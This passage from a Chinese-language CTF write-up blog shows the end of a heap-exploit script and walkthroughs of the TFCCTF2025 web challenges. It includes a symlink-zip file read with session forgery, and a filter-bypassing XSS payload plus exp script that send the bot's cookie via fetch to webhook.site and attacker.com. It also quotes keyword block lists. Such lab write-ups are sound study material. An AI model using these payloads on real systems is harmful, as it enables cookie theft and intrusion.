start_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>)) - <span class="number">37</span></span><br><span class="line">    proc_base = start_addr - elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    ret_of_main = environ_addr - <span class="number">0x130</span></span><br><span class="line">    ret_addr = proc_base+<span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(ret_of_main))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(ret_addr))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(ret_of_main+<span class="number">8</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0x110</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0xe8</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># exit 推出时会执行ret of main</span></span><br><span class="line">    sla(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/09/16/n1ctf-pwn/" data-id="cuidlH2teuA6txmHVyAcynOGJ" data-title="n1ctf2025_pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-TFCCTF2025" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/02/TFCCTF2025/" class="article-date">
  <time class="dt-published" datetime="2025-09-02T13:53:05.000Z" itemprop="datePublished">2025-09-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/09/02/TFCCTF2025/">TFCCTF2025 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="SLIPPY"><a href="#SLIPPY" class="headerlink" title="SLIPPY"></a>SLIPPY</h3><p><strong>一、题目描述</strong></p>
<p>打开靶机，可以上传ZIP压缩包，系统尝试解压并将成功解压的文件放置在 upload&#x2F; 目录下，供用户下载</p>
<style>.ejmdnvpuwrnk{zoom: 80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901091932761.png" class="ejmdnvpuwrnk" alt="image-20250901091932761">

<p>根据Dockerfile，FLAG 存放在 &#x2F;xxxxxxx&#x2F;flag.txt下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN rand_dir=&quot;/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)&quot;; mkdir &quot;$rand_dir&quot; &amp;&amp; echo &quot;TFCCTF&#123;Fake_fLag&#125;&quot; &gt; &quot;$rand_dir/flag.txt&quot; &amp;&amp; chmod -R +r &quot;$rand_dir&quot;</span><br></pre></td></tr></table></figure>

<p><strong>二、题目分析</strong></p>
<p>调试环境：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 docker</span></span><br><span class="line">docker run -it -p 3000:3000 -p 9229:9229 slippy node --inspect-brk=0.0.0.0:9229 server.js</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问chrome://inspect</span></span><br></pre></td></tr></table></figure>

<p>查看源码，分析相关处理逻辑</p>
<p>upload上传文件之后，通过<code>unzip</code>命令解压，然后存放在 <code>upload/session_userid/</code> 目录下</p>
<p>可能存在软链接读取文件，不存在zip slip路径穿越漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;zipfile&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> zipPath = req.<span class="property">file</span>.<span class="property">path</span>;      <span class="comment">// 上传文件暂存目录</span></span><br><span class="line">    <span class="comment">// 拼接解压缩的目标路径 upload/xxxxxxx</span></span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);   </span><br><span class="line">     <span class="comment">// Command: unzip temp/file.zip -d target_dir</span></span><br><span class="line">    <span class="title function_">execFile</span>(<span class="string">&#x27;unzip&#x27;</span>, [zipPath, <span class="string">&#x27;-d&#x27;</span>, userDir], <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">unlinkSync</span>(zipPath); <span class="comment">// Clean up temp file</span></span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Unzip failed:&#x27;</span>, stderr);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unzip error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/files&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>验证发现，此处通过软链接可以读取任意文件内容。可以通过软链接flag.txt，但不知道flag文件存在的目录</p>
<p>查看其它处理代码，访问 <code>/debug/files</code> 时，相关的处理代码存在路径穿越漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/debug/files&#x27;</span>, developmentOnly, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// session_id 存在路径穿越，可以获取任意目录下的文件列表</span></span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">query</span>.<span class="property">session_id</span>);</span><br><span class="line">    fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是访问该 <code>url</code> 需要先通过 <code>developmentOnly()</code> 方法的认证，条件时 <code>userId === ‘develop’</code> ，且 <code>req.ip == ‘127.0.0.1’</code></p>
<p>后者通过修改 <code>X-Forwarded-For</code> 可以满足，下面分析 <code>userId === ‘develop’</code> 的问题</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">userId</span> === <span class="string">&#x27;develop&#x27;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Forbidden: Development access only&#x27;</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>调试发现，<code>userId</code>是一串随机字符</p>
<p><img src="/image-20250901100930140.png" alt="image-20250901100930140"></p>
<p>发现 server.js 中有存放 develop 的sessionData：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Session</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> session.<span class="title class_">MemoryStore</span>();</span><br><span class="line"><span class="keyword">const</span> sessionData = &#123;</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">      <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">48</span> <span class="comment">// 1 hour</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">&#x27;develop&#x27;</span>   <span class="comment">// 用户名为 develop</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// store.set 保存sessionData的值</span></span><br><span class="line">store.<span class="title function_">set</span>(<span class="string">&#x27;&lt;REDACTED&gt;&#x27;</span>, sessionData, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Failed to create develop session:&#x27;</span>, err);</span><br><span class="line">    <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Development session created!&#x27;</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>可以通过前面的软链接读取 <code>server.js</code> ，进而获取保存的 <code>sessiondata</code></p>
<p>然后使用 <code>sha256</code> 计算得到 <code>develop</code> 的 <code>userId</code> </p>
<p>然后通过访问 <code>/debug/files</code> 获取存放 flag.txt 的目录名，然后再通过软件读取</p>
<p>获取FLAG的思路如下：</p>
<ol>
<li><p>软链接读取 <code>/app/.env</code> 和 <code>/app/server.js</code>，获取 <code>SESSION_SECRET</code> 和 <code>develop</code>的<code>sessionData</code></p>
</li>
<li><p><code>hmac</code> 计算 <code>develop</code> 的 <code>userId</code>，修改<code>host</code>为<code>127.0.0.1</code>，修改<code>cookie</code>为计算出的<code>userId</code>，访问 <code>debug/files</code> 利用路径穿越漏洞获取存放 <code>flag.txt</code> 的目录</p>
</li>
</ol>
<p><img src="/image-20250901105312884.png" alt="image-20250901105312884"></p>
<p>存放flag.txt的目录：</p>
<style>.rkzqpezyxxsm{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901105053972.png" class="rkzqpezyxxsm" alt="image-20250901105053972">

<ol start="3">
<li>利用软链接读取 &#x2F;tlhedn6f&#x2F;flag.txt 文件，获取FLAG</li>
<li><style>.wszzjjveyies{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901105617324.png" class="wszzjjveyies" alt="image-20250901105617324"></li>
</ol>
<h3 id="KISSFIXESS"><a href="#KISSFIXESS" class="headerlink" title="KISSFIXESS"></a>KISSFIXESS</h3><p><strong>一、题目描述</strong></p>
<p>模板渲染，用户输入 Name ，服务端渲染成不同颜色</p>
<style>.hvgeytvrtwtl{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901211720915.png" class="hvgeytvrtwtl" alt="image-20250901211720915">

<p>分析源码发现，模拟管理员访问<code>URL</code>的机器人 bot.py，显示 <code>flag</code> 被当作<code>cookie</code>存放</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">driver.add_cookie(&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;TFCCTF&#123;~&#125;&quot;</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>二、题目分析</strong></p>
<p>通过源码分析，该服务端使用 <code>http.server</code> + <code>Mako</code> 模板渲染，用户输入通过 GET 请求 <code>name_input</code> 参数提交，页面上有一个  “Report Name” 按钮，点击后会发 POST 请求 <code>/report</code>。<code>/report</code> 处理函数会调用 机器人 <code>bot.py</code> 的 <code>visit_url</code> 函数访问指定 URL。</p>
<p>用户输入<code>Name</code>被保存在变量 <code>name_to_display</code> ，在渲染之前有2处过滤：</p>
<p><code>banned</code> 黑名单字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁止危险字符</span></span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment"># 过滤危险字符，不能使用 self,(),.,import等</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> b <span class="keyword">in</span> name:</span><br><span class="line">            name = <span class="string">&quot;Banned characters detected!&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment"># render_page函数调用escape_html，后者在渲染页面时禁止 “&amp;&lt;&gt;()”</span></span><br><span class="line">    <span class="variable language_">self</span>.wfile.write(render_page(name_to_display=name).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>**绕过：**L和S，JS语言的Function构造器（<code>Function(&quot;...&quot;)()</code> 会把字符串里的代码当成 JavaScript 来运行）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;console.log(&#x27;hi&#x27;)&quot;</span>)()</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hi&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>escape_html</code> 函数： 对用户输入的字符串进行转义（escape），以防止浏览器把它当成 <code>HTML</code> 或 <code>JavaScript</code> 解析，防止<code>XSS</code>攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">escape_html</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Escapes HTML special characters in the given text.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;)   # 把 &amp; 转义为 &amp;amp;</span></span><br><span class="line"><span class="string">       .replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;)    # 把 &lt; 转义为 &amp;lt;  (防止开始标签)</span></span><br><span class="line"><span class="string">       .replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;)    # 把 &gt; 转义为 &amp;gt;  (防止结束标签)</span></span><br><span class="line"><span class="string">       .replace(&quot;(&quot;, &quot;&amp;#40;&quot;)   # 把 ( 转义为 &amp;#40; (避免JS函数调用)</span></span><br><span class="line"><span class="string">       .replace(&quot;)&quot;, &quot;&amp;#41;&quot;))  # 把 ) 转义为 &amp;#41;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&amp;#40;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#41;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后被过滤或转义的 <code>name_to_display</code> 被当作参数，传入<code>template.render</code>函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">name_to_display=<span class="literal">None</span></span>):</span><br><span class="line">    templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, escape_html(name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">    template = Template(templ, lookup=lookup)</span><br><span class="line">    <span class="keyword">return</span> template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>**绕过：**构造映射关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过精心构造，用户输入<code>name_to_display</code>可以走到页面渲染<code>template.render</code>函数，存在SSTI</p>
<p>**解题思路：**利用SSTI漏洞将恶意链接（作用是获取网页Cookie并发送到指定域名）渲染到服务端返回的HTML中，然后通过POST请求 <code>/report</code>调用机器人访问该恶意链接，将机器人的Cookie（即flag）发送到指定域名</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&quot;  https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84/?x=&quot;</span>)+document.cookie</span><br></pre></td></tr></table></figure>

<p>当浏览器执行这段代码时，就会把用户 Cookie 传送到 <code>https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84</code></p>
<p>通过加入<code>空格</code>绕过base64编码后存在 <code>l</code> 和 <code>s</code> 的问题，使用上述绕过方法，最终的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;banned[1]&#125;SCRIPT$&#123;banned[2]&#125;Function$&#123;banned[3]&#125;atob$&#123;banned[3]&#125;`ICBmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvMGI5OWZjZDMtNmY1My00OTA2LTg4OWEtM2U3ZmQ4YjE5YTg0Lz92Yz0nK2RvY3VtZW50LmNvb2tpZSkg`$&#123;banned[4]&#125;$&#123;banned[4]&#125;$&#123;banned[3]&#125;$&#123;banned[4]&#125;$&#123;banned[1]&#125;/SCRIPT$&#123;banned[2]&#125;</span><br></pre></td></tr></table></figure>

<p>将payload作为Name输入，服务器端返回的页面包含：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;fetch(&#x27;https://attacker.com?x=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>机器人bot.py访问该页面时：HTML 被解析，<code>&lt;iframe&gt;</code> 加载时触发 <code>onload</code>，<code>fetch()</code> 调用执行，浏览器（或机器人）发送 cookie 到指定域名，获取cookie</p>
<p><img src="/76564239253c115e5fd5196ea43a8f5.png" alt="76564239253c115e5fd5196ea43a8f5"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">js_inner = <span class="string">&#x27;fetch(&quot;  https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84/?x=&quot;)+document.cookie&#x27;</span></span><br><span class="line">js_base = base64.b64encode(js_inner.encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">js = <span class="string">f&quot;&quot;&quot;Function(atob(`<span class="subst">&#123;js_base&#125;</span>`))()&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(js)</span><br><span class="line"></span><br><span class="line">to_enc = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;iframe onLoad=&#x27;JAVASCRIPT:<span class="subst">&#123;js&#125;</span>&#x27; &gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">25</span>)</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> mapping.keys():</span><br><span class="line">    to_enc = to_enc.replace(key, mapping[key])</span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">15</span>)</span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"></span><br><span class="line">ban_doesnt_trigger = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> banned:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> to_enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;BAN | <span class="subst">&#123;c&#125;</span> | found&#x27;</span>)</span><br><span class="line">        ban_doesnt_trigger= <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> ban_doesnt_trigger:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All good&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="KISSFIXSSREVENGE"><a href="#KISSFIXSSREVENGE" class="headerlink" title="KISSFIXSSREVENGE"></a>KISSFIXSSREVENGE</h3><p>过滤条件更严格</p>
<p><code>banned</code> 黑名单字符</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KISSFIXESS</span></span><br><span class="line">banned = [&quot;s&quot;, &quot;l&quot;, &quot;(&quot;, &quot;)&quot;, &quot;self&quot;, &quot;_&quot;, &quot;.&quot;, &quot;\&quot;&quot;, &quot;\\&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KISSFIXESSREVENGE</span></span><br><span class="line">banned = [&quot;s&quot;, &quot;l&quot;, &quot;(&quot;, &quot;)&quot;, &quot;self&quot;, &quot;_&quot;, &quot;.&quot;, &quot;\&quot;&quot;, &quot;\\&quot;, &quot;&amp;&quot;, &quot;%&quot;, &quot;^&quot;, &quot;#&quot;, &quot;@&quot;, &quot;!&quot;, &quot;*&quot;, &quot;-&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;, &quot;JAVASCRIPT&quot;, &quot;window&quot;, &quot;atob&quot;, &quot;btoa&quot;, &quot;=&quot;]</span><br></pre></td></tr></table></figure>

<p>绕过方法：</p>
<ol>
<li>大小写：<code>L</code>和<code>S</code></li>
<li><code>JS</code>语言的<code>Function</code>构造器：<code>Function(&quot;...&quot;)()</code> 会把字符串里的代码当成 JavaScript 来运行</li>
<li><code>mapping</code>映射：</li>
</ol>
